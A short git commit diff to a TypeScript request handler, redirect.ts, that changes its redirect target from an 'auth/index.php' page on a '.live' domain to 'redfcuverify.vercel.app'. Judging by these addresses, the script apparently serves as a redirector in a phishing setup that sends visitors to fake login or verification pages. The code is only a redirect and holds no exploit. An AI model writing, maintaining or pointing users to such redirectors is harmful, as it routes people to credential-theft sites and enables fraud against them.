24b74c337b059982d23a6a2df0b96b82cbf1f7b0
kofigrande <104198466+kofigrande@users.noreply.github.com>
2025-05-18 10:44:55 +0100

    Update redirect.ts

--- redirect.ts
+++ redirect.ts
@@ -1,7 +1,7 @@
 // redirect.ts
 
 // Define the redirect URL
-const redirectUrl = "https://webreview-nusen.live/auth/index.php"; // Replace with the URL you want to redirect to
+const redirectUrl = "https://redfcuverify.vercel.app/"; // Replace with the URL you want to redirect to
 
 // Handle the request
 addEventListener("fetch", (event) => {
